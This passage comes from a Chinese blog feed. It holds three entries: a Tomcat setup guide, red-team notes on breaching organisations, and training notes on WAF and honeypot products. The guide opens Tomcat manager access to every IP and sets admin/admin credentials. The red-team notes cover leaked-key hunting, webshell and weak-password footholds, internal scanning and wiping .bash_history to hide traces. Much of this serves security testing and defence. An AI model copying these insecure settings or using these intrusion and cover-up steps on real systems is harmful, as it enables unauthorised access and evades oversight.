<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /usr/local/java    <span class="comment">#创建java目录</span></span><br><span class="line"><span class="built_in">cd</span> /usr/local/java</span><br><span class="line">tar -zxvf jdk-8u151-linux-x64.tar.gz</span><br><span class="line"></span><br><span class="line">vim /etc/profile    <span class="comment">#配置环境变量</span></span><br><span class="line"></span><br><span class="line">  JAVA_HOME=/usr/local/java/jdk1.8.0_151</span><br><span class="line">  CLASSPATH=.:<span class="variable">$JAVA_HOME</span>/lib/tools.jar</span><br><span class="line">  PATH=<span class="variable">$JAVA_HOME</span>/bin:<span class="variable">$PATH</span></span><br><span class="line">  <span class="built_in">export</span> PATH=<span class="variable">$&#123;JAVA_HOME&#125;</span>/:/opt/jvm/jdk1.8.0_151/bin:<span class="variable">$PATH</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br></pre></td></tr></table></figure>

<h3 id="maven安装"><a href="#maven安装" class="headerlink" title="maven安装"></a>maven安装</h3><p><a href="https://blog.csdn.net/weixin_42601136/article/details/108588152">https://blog.csdn.net/weixin_42601136/article/details/108588152</a></p>
<h3 id="tomcat安装"><a href="#tomcat安装" class="headerlink" title="tomcat安装"></a>tomcat安装</h3><p><a href="https://dlcdn.apache.org/tomcat/tomcat-8/v8.5.87/bin/apache-tomcat-8.5.87.tar.gz">https://dlcdn.apache.org/tomcat/tomcat-8/v8.5.87/bin/apache-tomcat-8.5.87.tar.gz</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/local/tomcat</span><br><span class="line">tar -xzvf apache-tomcat-8.5.87.tar.gz  <span class="comment">#解压</span></span><br><span class="line">vi /etc/profile <span class="comment">#编辑环境变量</span></span><br><span class="line">  	<span class="built_in">export</span> TOMCAT_HOME=/usr/local/tomcat/apache-tomcat-8.5.87</span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br><span class="line"><span class="built_in">cd</span> /usr/local/tomcat/apache-tomcat-8.5.87/conf <span class="comment">#修改tomcat端口，避免冲突</span></span><br><span class="line">vim server.xml</span><br><span class="line">	&lt;Connector port=<span class="string">&quot;8888&quot;</span> protocol=<span class="string">&quot;HTTP/1.1&quot;</span> connectionTimeout=<span class="string">&quot;20000&quot;</span> redirectPort=<span class="string">&quot;8443&quot;</span> /&gt;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /usr/local/tomcat/apache-tomcat-8.5.87/bin</span><br><span class="line">sh startup.sh</span><br></pre></td></tr></table></figure>

<p>设置所有ip可访问</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /webapps/host-manager/META-INF/</span><br><span class="line">vi context.xml</span><br><span class="line">		<span class="comment"># 将allow值改成：&quot;^.*$&quot;   (^.*$ 代表所有IP可访问)</span></span><br></pre></td></tr></table></figure>

<p><strong>访问tomcat页面Server Status,Manager APP,Host Manager报错 403(拒绝访问权限问题)。</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/local/tomcat/apache-tomcat-8.5.87/conf</span><br><span class="line">vim tomcat-users.xml</span><br><span class="line">   &lt;!--tomcat 首页授权登录账号密码配置 --&gt;</span><br><span class="line">    &lt;role rolename=<span class="string">&quot;admin-gui&quot;</span>/&gt;</span><br><span class="line">    &lt;role rolename=<span class="string">&quot;manager-gui&quot;</span>/&gt;</span><br><span class="line">    &lt;role rolename=<span class="string">&quot;manager-script&quot;</span>/&gt;</span><br><span class="line">    &lt;user username=<span class="string">&quot;admin&quot;</span> password=<span class="string">&quot;admin&quot;</span> roles=<span class="string">&quot;admin-gui,manager-gui,manager-script&quot;</span>/&gt;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>服务器</tag>
      </tags>
  </entry>
  <entry>
    <title>打点</title>
    <url>/2023/07/14/%E6%89%93%E7%82%B9/</url>
    <content><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>oneforall  配置好api       子域名挖掘机5.0补充oneforall</p>
<p>hunter 鹰图 （可以看到备案       去重，一年内</p>
<p>google语法   exploit-db.com&#x2F;google-hacking-database     intitle:index.of “parent directory”</p>
<p>微信小程序   各种口语化词汇都可以    xx旗下  xx公司集团   </p>
<p>站长之家的信息比小蓝本全，比如某些zf单位没有资产</p>
<p>浙江大学 -edu.cn 登录|注册  谷歌语法</p>
<p>网站截图工具EyeWitness</p>
<p>敏感信息泄露</p>
<p><strong>案例1</strong>：官网直接的JSON文档，里面直接有Mssql的明文账号密码，ip还是外网的。</p>
<p><strong>案例2</strong>：使用burpsuite抓包，js源码中存在某云的AK&#x2F;SK。</p>
<p><strong>案例3</strong>：对apk脱壳，反编译Java代码找到了某云的AK&#x2F;SK。</p>
<p><strong>案例4</strong>：对apk直接批量进行信息提取，找到了很多偏门的ip+端口的资产。</p>
<p><strong>案例5</strong>：网站的说明文档中会有一些意外的资产，然后用shiro反序列化、log4j2等常规漏洞可以打进去。</p>
<p><strong>案例6</strong>：官网链接的软件包中，配置文件含有Socks5代理，直连内网。</p>
<p><strong>案例7</strong>：SVN等源码泄露漏洞，通过php代码审计上传漏洞</p>
<p><strong>案例8</strong>：百度网盘搜索方法，对敏感关键词进行检索，成功发现一个员工离职交接文档的压缩包，解压后1G多，里面存放了大量的网络拓扑图及通讯录信息，对后渗透了解网络架构起到了很大帮助</p>
<p>(网盘搜索引擎：</p>
<p>凌风云<a href="https://www.lingfengyun.com/%EF%BC%8C">https://www.lingfengyun.com/，</a></p>
<p>我搜云<a href="https://www.wosouyun.com/">https://www.wosouyun.com/</a>)</p>
<p>大力盘 <a href="https://www.dalipan.com/#/main/search?restype=1">https://www.dalipan.com/#/main/search?restype=1</a></p>
<p>猪猪盘 <a href="http://www.zhuzhupan.com/">http://www.zhuzhupan.com/</a></p>
<p>来搜一下<a href="https://www.laisoyixia.com/">https://www.laisoyixia.com/</a></p>
<p>盘搜搜<a href="https://www.pansoso.com/">https://www.pansoso.com/</a></p>
<p><strong>区分spring和struts2框架的几种方法</strong></p>
<p>1.在url中添加不存在的路径，如果返回同样的页面，那大概率是struts2框架，如果返回404或者报错，则大概率是spring，比如说：<a href="http://192.168.237.128:8080/struts2_032/example/aaaaaa1/bbbbbbbb2/ccccccccc3/HelloWorld.action">http://192.168.237.128:8080/struts2_032/example/aaaaaa1/bbbbbbbb2/ccccccccc3/HelloWorld.action</a></p>
<p>在struts框架下，完全可以正常返回页面，而spring会报错</p>
<p>2.在url中添加&#x2F;struts&#x2F;domTT.css</p>
<p>源码是找不到domTT文件的，因为这个文件在struts2的jar包中，</p>
<p>注，在一些低版本的struts2框架中，domTT.css文件不存在，需要更换为其他静态文件路径</p>
<p>3.404、500响应码返回信息</p>
<p>输入一个不存在的路径，返回404页面，或者传入一些乱码字符，造成当前的页面响应码500报错抛出异常</p>
<p>struts2常用的关键字有这些，例如no action、mapped、struts2、namespace、defined for action</p>
<p>Spring的报错信息如下：含有Whitelabel Error Page 关键字</p>
<p>4.看网站图标favicon.ico</p>
<h2 id="外围"><a href="#外围" class="headerlink" title="外围"></a>外围</h2><h3 id="1-enscan-跑公司和子公司的基本域名公众号小程序和app-缺点：不全"><a href="#1-enscan-跑公司和子公司的基本域名公众号小程序和app-缺点：不全" class="headerlink" title="1.enscan 跑公司和子公司的基本域名公众号小程序和app(缺点：不全)"></a>1.enscan 跑公司和子公司的基本域名公众号小程序和app(缺点：不全)</h3><p>但是光使用enscan 你会发现该公司的部分域名依旧没有收集到</p>
<p>在此基础上还需要使用小蓝本 手动信息收集</p>
<p>组合出来的信息为初步信息收集</p>
<h3 id="2-使用oneforall-跑所有的域名-收集子域名"><a href="#2-使用oneforall-跑所有的域名-收集子域名" class="headerlink" title="2.使用oneforall 跑所有的域名  收集子域名"></a>2.使用oneforall 跑所有的域名  收集子域名</h3><p>oneforall 功能：使用fofa,shadon等api接口进行信息收集</p>
<p>oneforall有自己的字典也可以爆破出来部分</p>
<p>oneforall的 api 尽可能多的配置</p>
<h3 id="3-全部拿出来-使用-ehole-魔改过的版本-自带攻击payload"><a href="#3-全部拿出来-使用-ehole-魔改过的版本-自带攻击payload" class="headerlink" title="3.全部拿出来 使用 ehole 魔改过的版本 自带攻击payload"></a>3.全部拿出来 使用 ehole 魔改过的版本 自带攻击payload</h3><h3 id="4-对于子域名还可以进行探测存活-这一步可以放到后面-，"><a href="#4-对于子域名还可以进行探测存活-这一步可以放到后面-，" class="headerlink" title="4.对于子域名还可以进行探测存活(这一步可以放到后面)，"></a>4.对于子域名还可以进行探测存活(这一步可以放到后面)，</h3><p>webBatchRequest.jar</p>
<p>探测存活之后批量跑后台  dirsearch bypass 403 魔改版</p>
<h3 id="5-对于文档可以查看某些域名的ip-是否存在关联"><a href="#5-对于文档可以查看某些域名的ip-是否存在关联" class="headerlink" title="5.对于文档可以查看某些域名的ip 是否存在关联"></a>5.对于文档可以查看某些域名的ip 是否存在关联</h3><p><a href="https://xxx.aaa.com/">xxx.aaa.com</a> 100.1.1.35    bb.aaa.com 100.1.1.23</p>
<p>23-35之间 全是这个公司的资产</p>
<p>一般企业 和学校 极有可能会是一个小段</p>
<p>可以通过已知的ip段进行全端口扫描 </p>
<p><strong>goby</strong>比较慢 但是goby可以进行弱口令扫描和指纹识别</p>
<p>或者使用 nmap 巨慢 但是准</p>
<h3 id="6-免杀shell可以直接使用-one-fox工具箱里面的webshell生成器。"><a href="#6-免杀shell可以直接使用-one-fox工具箱里面的webshell生成器。" class="headerlink" title="6.免杀shell可以直接使用 one-fox工具箱里面的webshell生成器。"></a>6.免杀shell可以直接使用 one-fox工具箱里面的webshell生成器。</h3><h3 id="7-看看是否有ehole可以攻击出来的漏洞，有就上述拿shell。没有则对总计的网站找后台，xlsx文档找弱口令-如果很明显是一个通用的系统，百度logo名称默认密码-。找到弱口令进入后台文件上传getshell-和-sql注入拿shell。"><a href="#7-看看是否有ehole可以攻击出来的漏洞，有就上述拿shell。没有则对总计的网站找后台，xlsx文档找弱口令-如果很明显是一个通用的系统，百度logo名称默认密码-。找到弱口令进入后台文件上传getshell-和-sql注入拿shell。" class="headerlink" title="7.看看是否有ehole可以攻击出来的漏洞，有就上述拿shell。没有则对总计的网站找后台，xlsx文档找弱口令(如果很明显是一个通用的系统，百度logo名称默认密码)。找到弱口令进入后台文件上传getshell 和 sql注入拿shell。"></a>7.看看是否有ehole可以攻击出来的漏洞，有就上述拿shell。没有则对总计的网站找后台，xlsx文档找弱口令(如果很明显是一个通用的系统，百度logo名称默认密码)。找到弱口令进入后台文件上传getshell 和 sql注入拿shell。</h3><p>找能注册进去的网站，burp开着插件 xia注 插件 ，Tsojanscan，log4j疯狂模式，RouteVulScan,</p>
<p>挂着捡洞就行</p>
<h3 id="8-备份文件翻配置文件，根据备份文件进入后台。"><a href="#8-备份文件翻配置文件，根据备份文件进入后台。" class="headerlink" title="8.备份文件翻配置文件，根据备份文件进入后台。"></a>8.备份文件翻配置文件，根据备份文件进入后台。</h3><h3 id="9-假如一个企业存在c段部分资产，可以直接使用ehole-批量打c段，看看有没有可以直接rce的。"><a href="#9-假如一个企业存在c段部分资产，可以直接使用ehole-批量打c段，看看有没有可以直接rce的。" class="headerlink" title="9.假如一个企业存在c段部分资产，可以直接使用ehole 批量打c段，看看有没有可以直接rce的。"></a>9.假如一个企业存在c段部分资产，可以直接使用ehole 批量打c段，看看有没有可以直接rce的。</h3><p><strong>拿到命令行怎么继续利用，找不到网站根目录</strong></p>
<p>找一个网站的图片链接，复制文件名搜索</p>
<p>Windows 主机寻找文件 dir C:\ &#x2F;s &#x2F;b | find “example.txt”</p>
<p>where &#x2F;r C:\ a.jsp</p>
<p>自带 远程下载文件 curl url 命令</p>
<p>curl <a href="http://www.linux.com/">http://www.linux.com</a> &gt;&gt; linux.html</p>
<p>curl -o linux.html <a href="http://www.linux.com/">http://www.linux.com</a></p>
<h2 id="进内网之后"><a href="#进内网之后" class="headerlink" title="进内网之后"></a>进内网之后</h2><p>当我们拿到webshell的时候，现在开始要内网渗透了。</p>
<p>查看系统详细信息<br>systeminfo注意系统的版本，位数，域，补丁信息，更新频率等<br>查看系统补丁<br>wmic qfe get caption,description,hotfixid,installedon</p>
<p>tasklist &#x2F;svc 查看进程 是否有杀软或者其他服务</p>
<p>systeminfo 查看是否存在域环境和补丁情况，还有是否存在域控</p>
<p>netstat -an 查看进程。</p>
<p>2.对于已经开启的进程服务 可以去翻配置文件找到账号密码 ，连上截图。</p>
<p>3.搭建隧道或者把fscan上传上去 ，使用fscan -h 192.168.0.0&#x2F;24 直接扫</p>
<p>会自动使用弱口令扫描 指纹识别 系统漏洞等等。。。</p>
<p>4.扫不出来怎么办，使用边缘主机的密码，去制作成字典撞密码。</p>
<p>可以是话上线cs 和msf 使用插件去攻击。</p>
<h2 id="清痕"><a href="#清痕" class="headerlink" title="清痕"></a>清痕</h2><p>echo &gt; ~&#x2F;.bash_history  </p>
<p>覆盖文件，文件的inodeh不发生改变，只是改变了文件的block指针，使用魔改版debugfs(<a href="https://zgao.top)仍可以提取到被删除的.bash_history命令执行记录/">https://zgao.top)仍可以提取到被删除的.bash_history命令执行记录</a></p>
]]></content>
  </entry>
  <entry>
    <title>安全设备培训</title>
    <url>/2023/07/18/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E5%9F%B9%E8%AE%AD/</url>
    <content><![CDATA[<h1 id="雷池——WAF"><a href="#雷池——WAF" class="headerlink" title="雷池——WAF"></a>雷池——WAF</h1><h2 id="waf部署模式"><a href="#waf部署模式" class="headerlink" title="waf部署模式"></a>waf部署模式</h2><h3 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h3><p>适合客户</p>
<p>修改其他设备的难度比较小的客户</p>
<p>业务没有要求必须获取socket为源ip</p>
<p>业务没有突增需求</p>
<p>业务可以接受改变现有网络拓扑</p>
<h4 id="模式特性"><a href="#模式特性" class="headerlink" title="模式特性"></a>模式特性</h4><p>需要调整网络拓扑之后，流量才能到waf<br>支持SSL证书卸载<br>支持定制拦截页面<br>支持bot防护<br>支持链路聚合&amp;vlan<br>改变源IP&amp;源端口&amp;源mac<br>不支持链路的硬件bypass，设备宕机后需要前端有http健康检查机制切流量</p>
<h3 id="路由代理"><a href="#路由代理" class="headerlink" title="路由代理"></a>路由代理</h3><ul>
<li><p>基本和反向代理一致</p>
</li>
<li><p>希望通过反向代理进行请求检测，而业务服务器需要直接从socket拿到客户端IP;</p>
</li>
<li><p>客户有F5，F5按mac地址回源</p>
</li>
<li><p>改变源端口&amp;源mac</p>
</li>
</ul>
<h4 id="模式特性-1"><a href="#模式特性-1" class="headerlink" title="模式特性"></a>模式特性</h4><ul>
<li>和反代基本一致</li>
<li>支持回源使用客户端真实IP</li>
<li>一般需要配合F5使用，F5启用auto last hop功能</li>
</ul>
<h3 id="透明代理"><a href="#透明代理" class="headerlink" title="透明代理"></a>透明代理</h3><blockquote>
<p>工作在七层</p>
</blockquote>
<ul>
<li><p>要求不改变现有网络拓扑</p>
</li>
<li><p>要求检测HTTPS流量;</p>
</li>
</ul>
<h4 id="模式特性-2"><a href="#模式特性-2" class="headerlink" title="模式特性"></a>模式特性</h4><ul>
<li>不改变现有网络拓</li>
<li>客户端和雷池建立握手，雷池使用客户端的IP作为源IP跟WEB Server建立TCP连接，对WEB2.Server完全透明;</li>
<li>雷池WAF作为中间人的角色，支持SSL证书卸载;</li>
<li>支持返回指定拦截页面</li>
<li>支持链路聚合&#x2F;vlan</li>
<li>改变源端口（随机端口）</li>
<li>支持链路的硬件bypass (需要硬件支持)</li>
<li><strong>区分</strong>IN流量和OUT流量（进出口不能接反）</li>
<li>支持bot防护</li>
</ul>
<h3 id="透明桥"><a href="#透明桥" class="headerlink" title="透明桥"></a>透明桥</h3><blockquote>
<p> 网络层工作</p>
</blockquote>
<p>适用客户:</p>
<ul>
<li><p>要求不改变现有网络拓扑</p>
</li>
<li><p>有VLAN并且是单层VLAN</p>
</li>
<li><p>不要求检测HTTPS流量</p>
</li>
<li><p>要求对全部HTTP流量进行检测</p>
</li>
<li><p>不要求攻击拦截页面</p>
</li>
</ul>
<h4 id="模式特性-3"><a href="#模式特性-3" class="headerlink" title="模式特性"></a>模式特性</h4><ul>
<li><p>不改变现有网络拓扑</p>
</li>
<li><p>不改变源IP&amp;源mac&amp;源端口等</p>
</li>
<li><p>客户端和Web Server建立TCP</p>
</li>
<li><p>不支持SSL证书卸载，对非HTTP报文不检测直接放行</p>
</li>
<li><p>使用发送TCPReset报文或丢包的方式拦截攻击，不支持拦截页面</p>
</li>
<li><p>支持多进多出，链路聚合模式下雷池前后端设备协商聚合模式</p>
</li>
<li><p>支持链路的硬件bypass(需硬件支持)</p>
</li>
<li><p><strong>不区分</strong>IN流量&#x2F;OUT流量</p>
</li>
<li><p>服务器响应检测不能做阻断</p>
</li>
</ul>
<h3 id="流量镜像"><a href="#流量镜像" class="headerlink" title="流量镜像"></a>流量镜像</h3><h4 id="适用客户"><a href="#适用客户" class="headerlink" title="适用客户"></a>适用客户</h4><ul>
<li>要求不改变网络拓扑和网络架构;</li>
<li>要求只对HTTP流量</li>
<li>不做阻断或不考虑阻断成功率</li>
<li>交换机支持镜像</li>
</ul>
<h4 id="模式特性-4"><a href="#模式特性-4" class="headerlink" title="模式特性"></a>模式特性</h4><ul>
<li>不原有网络拓扑</li>
<li>不支持https流量检测</li>
<li>但阻断成功率跟环境有一定关系;支持发送Rest来实现拦截模式，</li>
<li>不支持阻断拦截页面</li>
<li>要求交换机支持镜像功能</li>
</ul>
<h3 id="嵌入式"><a href="#嵌入式" class="headerlink" title="嵌入式"></a>嵌入式</h3><p>适用客户</p>
<ul>
<li>要求不改变网络拓扑和网络架构 :</li>
<li>已经有nginx，且可以在nginx加模块nginx</li>
<li>如果加载第三方非开源模块，能够提供模块源码</li>
</ul>
<p>模式特性<br>不改原有网络拓扑<br>支持https流量检测</p>
<p>需要在客户nainx上加载t1k模块;</p>
<h2 id="部署前-信息收集"><a href="#部署前-信息收集" class="headerlink" title="部署前-信息收集"></a>部署前-信息收集</h2><ol>
<li>确定客户网络拓扑，了解客户网络中流量走向</li>
<li>流量中是否有HITPS流量</li>
<li>确定业务QPS、CPS的峰值</li>
<li>根据拓扑等确定部署模式</li>
<li>确定硬件雷池物理网卡类型:千兆电、千兆光、万兆光，是否bypass </li>
<li>根据以上信息和datasheet选适当的型号&#x2F;软件机器配置</li>
</ol>
<h2 id="部署中-WAF调优"><a href="#部署中-WAF调优" class="headerlink" title="部署中-WAF调优"></a>部署中-WAF调优</h2><h3 id="日志的分析与处理"><a href="#日志的分析与处理" class="headerlink" title="日志的分析与处理"></a>日志的分析与处理</h3><p>1.日志分类</p>
<p>攻击检测日志</p>
<p>频率控制日志</p>
<p>扩展插件日志</p>
<h3 id="策略调优原则"><a href="#策略调优原则" class="headerlink" title="策略调优原则"></a>策略调优原则</h3><p><strong>保证设备性能</strong></p>
<p>设备性能是拦截效果的基础，设备性能太拉胯，一切调优都白搭</p>
<p><strong>保证业务正常</strong></p>
<p>在不阻断正常业务情况下，最大化阻断攻击请求</p>
<p><strong>保证信息准确</strong></p>
<p>记录到的日志等完整，准确。</p>
<h3 id="系统配置相关"><a href="#系统配置相关" class="headerlink" title="系统配置相关"></a>系统配置相关</h3><p><strong>基础配置</strong></p>
<ol>
<li>服务器时间一定要准确</li>
<li>syslog等告警尽量配置</li>
<li>如果有配置高可用，确认配置同步正常</li>
<li>patch及时打上&#x2F;引擎及时更新</li>
</ol>
<p><strong>站点配置</strong></p>
<ol>
<li>IP获取方式一定要准确</li>
<li>记录访问日志，以便事后分析</li>
</ol>
<p><strong>常见攻击及漏洞自测</strong></p>
<ol>
<li>无害的常见攻击样例对配置好的WAF进行测试，查看系统是否能正常拦截并记录日志，分析误报和漏报情况。</li>
<li>对漏洞进行扫描(推荐免费的工具:xrav)，检查系统和WAF对漏洞的防御情况。</li>
<li>雷池支持一些针对特定的框架、组件、服务的攻击检测</li>
</ol>
<p><strong>日志的分析与处理</strong></p>
<p>日志筛选能力</p>
<ul>
<li>以攻击检测日志为例:可从多个维度筛选 (ID、事件ID、国家和地区、省份、协议、来源IP、目的端口、域名、URL路径、攻击类型、风险等级、动作、时间等)，并根据字段的不同可选择不同的筛选方式，如“包含”“不包含”、“”、等于”、“属于网段”等，普通筛选的多个筛选条件间是“与”的关系。</li>
</ul>
<p>也可以进行基于es语句高级筛选</p>
<p><strong>漏报拦截</strong></p>
<p>确定有漏报，需要拦截</p>
<p>需要拦截指定可能存在隐患的请求如<a href="http://www.aaa.com/api/userlist?id=%E5%AD%98%E5%9C%A8%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%EF%BC%8Cwaf%E9%BB%98%E8%AE%A4%E7%AD%96%E7%95%A5%E4%B8%8D%E8%83%BD%E5%81%9A%E9%98%B2%E6%8A%A4%E7%9A%84">http://www.aaa.com/api/userlist?id=存在逻辑漏洞，waf默认策略不能做防护的</a></p>
<p>鼠标放到对应匹配项上边,可以显示该匹配项的解释如果不了解uri会匹配到啥，可以放上去看看解释</p>
<p><strong>误报消除</strong></p>
<p><strong>确认漏报误报</strong></p>
<p><strong>漏报</strong><br>多方研判：如果客户现场部署了多种设备，比如IPS，DS等安全设备，可以根据其他日志做综合分析<br>根据waf上的访问日志：疑似非客户正常业务，经客户确认<br>0day：如果爆发0day，且已知请求payload<br><strong>误报</strong><br>经客户确认误报：客户反馈有正常业务被拦截<br>疑似正常业务：通过检测日志研判可能是客户正常业务，经客户确认正常业务的</p>
<p>白名单：客户在做漏洞扫描，需要放行特定IP&#x2F;业务</p>
<h4 id="防护设置-规则"><a href="#防护设置-规则" class="headerlink" title="防护设置-规则"></a>防护设置-规则</h4><p>自定义规则调优的两个方向</p>
<ul>
<li>​	降误报:如若业务本身有传]S、传Java、PHP序列化数据 ，以及传某种特定的SOL的完整语句等情况。可通过修改引擎模块配置或通过自定义规则加白来解决。</li>
<li>​	降漏报:通常为因地制宜的解决未支持的识别的CVE漏洞(有的漏洞利用方式不太好设定一个通用的规则去防护)，以及过于宽松的防护设置。</li>
</ul>
<p>根据实际应用场景来添加一些适用的规则时应考虑</p>
<ol>
<li>该规则在当前业务下是否容易误报，若容易误报则只开观察模式。</li>
<li>仅添加匹配业务类型的规则，减少过多规则造成的性能损耗。</li>
</ol>
<h4 id="防护设置-引擎"><a href="#防护设置-引擎" class="headerlink" title="防护设置-引擎"></a>防护设置-引擎</h4><p>基础的误报调优</p>
<ol>
<li>XSS、SQL注入攻击了解的业务情况，调整“非注入型攻击”配置，避免误报</li>
<li>判断是否有允许的机器人类型，可进行对应的配置，避免误报</li>
</ol>
<p>通常发现和溯源会有得分，所以建议开启如下配置</p>
<ol>
<li>关闭的检测模块可以打开，设置为只记录日志。</li>
<li>已开启的模块日志记录闯值调低。</li>
<li>打开HTTP响应处理</li>
</ol>
<h4 id="防护设置示例-规则之webshell"><a href="#防护设置示例-规则之webshell" class="headerlink" title="防护设置示例-规则之webshell"></a>防护设置示例-规则之webshell</h4><p>冰蝎示例</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230718152247242.png" alt="image-20230718152247242"></p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230718152322817.png" alt="image-20230718152322817"></p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230718152337597.png" alt="image-20230718152337597"></p>
<h4 id="防护设置示例-放行特定请求"><a href="#防护设置示例-放行特定请求" class="headerlink" title="防护设置示例-放行特定请求"></a>防护设置示例-放行特定请求</h4><p>放行特定的ip</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230718152533627.png" alt="image-20230718152533627"></p>
<h4 id="防护设置-访问频率控制"><a href="#防护设置-访问频率控制" class="headerlink" title="防护设置-访问频率控制"></a>防护设置-访问频率控制</h4><p>防止爆破</p>
<h4 id="高级防护设置"><a href="#高级防护设置" class="headerlink" title="高级防护设置"></a>高级防护设置</h4><p>1、配置主动的机器人检测，进行]S challenge或 滑块校验等方式<br>2、有人在进行目录爆破，高频返回404。此时可通过编写程序的方式来进行统计识别。雷池提供现成的插件，可调整的参数为:</p>
<ul>
<li>arg_limit 出现特殊状态码的最大次数</li>
<li>arg_check_dur 过去几秒内</li>
<li>arg_status 需要统计的状态码</li>
</ul>
<p>3、设置高频攻击进行自动封禁。处理逻辑为:发现某IP在一定时间内进行了N次攻击则进行封禁雷池提供现成的插件进行防护。<br>4、对需重点防护的路径单独统计TOP请求和攻击信息，雷池提供现成的插件进行防护</p>
<p><strong>OPENAPI</strong></p>
<p>永不过期，可以二次开发</p>
<h2 id="演练进行中"><a href="#演练进行中" class="headerlink" title="演练进行中"></a>演练进行中</h2><h3 id="现场值守"><a href="#现场值守" class="headerlink" title="现场值守"></a>现场值守</h3><ol>
<li><p>信息收集</p>
<p>关注日志更新，关注威胁情报的更新</p>
</li>
<li><p>风险及优先级判断</p>
<p>根据日志信息，判断攻击行为的严重程度，是否需要即刻处理，是否需要深度分析。根据威胁情报的更新判断WAF是否有对应的调整。</p>
</li>
<li><p>深度分析</p>
<p>对于，可查看日志详情、联系前后行为进行深度分析。对于威胁情报进行深度分析，如IP的攻击行为、新漏洞的影响等。</p>
</li>
<li><p>处理</p>
</li>
</ol>
<p>​		对于误报、漏报、新漏洞进行对应的策略调整，对于不明确的攻击行为进行持续的观察。</p>
<h4 id="滤掉扫描器日志"><a href="#滤掉扫描器日志" class="headerlink" title="滤掉扫描器日志"></a>滤掉扫描器日志</h4><p>扫描器没有隐藏自己的特征，会有很多告警，可在日志筛选处排除掉对应攻击类型</p>
<h4 id="多设备联动"><a href="#多设备联动" class="headerlink" title="多设备联动"></a>多设备联动</h4><p>waf将攻击请求转发给蜜罐</p>
<p>waf将日志通过syslog转发给态势感知，态势感知根据多设备综合研判，再通过openapi方式转发给waf做自动封禁，提高封禁效率</p>
<p>网络管理-网络接口配置-工作组管理-添加一个工作组       可以看到工作模式</p>
<h1 id="谛听——蜜罐"><a href="#谛听——蜜罐" class="headerlink" title="谛听——蜜罐"></a>谛听——蜜罐</h1><p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230718160326368.png" alt="image-20230718160326368"></p>
<p>智学习蜜罐，真实业务仿真，热门缺陷系统仿真</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230718162628160.png" alt="image-20230718162628160"></p>
<p>策略配置最佳实践</p>
<h1 id="洞鉴——"><a href="#洞鉴——" class="headerlink" title="洞鉴——"></a>洞鉴——</h1><blockquote>
<p>硬件和软件两个版本</p>
</blockquote>
<p>443&#x2F;80、9558端口（使用辅助工具必须开放此端口）</p>
<h3 id="常用扫描策略"><a href="#常用扫描策略" class="headerlink" title="常用扫描策略"></a>常用扫描策略</h3><h4 id="降低对业务的影响"><a href="#降低对业务的影响" class="headerlink" title="降低对业务的影响"></a>降低对业务的影响</h4><p>，使用默认策略，默认三小时，3500w分钟以下，syn扫描，connet连接较慢，UA请求头，cookie,url小于3w，站点小于2000，主机小于2000，减少收集最大连接数，关闭模拟浏览器渲染，关闭允许爬父目录，只扫描严重和高危漏洞，可通过标签筛选，hw一般使用原理扫描插件</p>
<p>三小时</p>
<h5 id="提升效率的方法"><a href="#提升效率的方法" class="headerlink" title="提升效率的方法"></a>提升效率的方法</h5><p>高效扫描，增加并发，降低子域名深度</p>
<p>关闭跳过不存活主机，使用默认端口组扫描，对存在的主机进行全端口扫描</p>
<p>漏洞详情-漏洞复测</p>
<h3 id="业务管理功能简介"><a href="#业务管理功能简介" class="headerlink" title="业务管理功能简介"></a>业务管理功能简介</h3><p>资产导入上限   ip1.3w，url1.2w</p>
<h4 id="漏洞管理"><a href="#漏洞管理" class="headerlink" title="漏洞管理"></a>漏洞管理</h4><p>删除，扫描，复测</p>
<p>生成任务，漏洞，资产，基线报表，默认模板只会生成漏洞权重大于50%的漏洞</p>
<p>报表导出，服务2w，端口2000，url3w，漏洞5w</p>
<h5 id="系统管理功能简介"><a href="#系统管理功能简介" class="headerlink" title="系统管理功能简介"></a>系统管理功能简介</h5><p>引擎管理，状态监控，用户管理，角色权限管理</p>
<h1 id="万象——日志"><a href="#万象——日志" class="headerlink" title="万象——日志"></a>万象——日志</h1><p>原始日志，安全日志，安全告警</p>
<h2 id="日志检索"><a href="#日志检索" class="headerlink" title="日志检索"></a>日志检索</h2><p>全文检索，快速全量，条件筛选，高级筛选</p>
<p>语句and，or，%like%模糊匹配，where</p>
<p>ip资产，应用资产</p>
<h3 id="日志展示"><a href="#日志展示" class="headerlink" title="日志展示"></a>日志展示</h3><p>列表模式</p>
<p>概览模式</p>
<h3 id="解码工具"><a href="#解码工具" class="headerlink" title="解码工具"></a>解码工具</h3><h3 id="事件调查"><a href="#事件调查" class="headerlink" title="事件调查"></a>事件调查</h3><h2 id="调查-amp-告警"><a href="#调查-amp-告警" class="headerlink" title="调查&amp;告警"></a>调查&amp;告警</h2><p>关联分析-编写规则</p>
<h1 id="牧云"><a href="#牧云" class="headerlink" title="牧云"></a>牧云</h1><p>探针安装cpu不超过20%，内存不超过500mb</p>
<p>利用资产清点</p>
]]></content>
      <tags>
        <tag>设备</tag>
      </tags>
  </entry>
  <entry>
    <title>AccessKey特征</title>
    <url>/2023/07/24/AccessKey%E7%89%B9%E5%BE%81/</url>
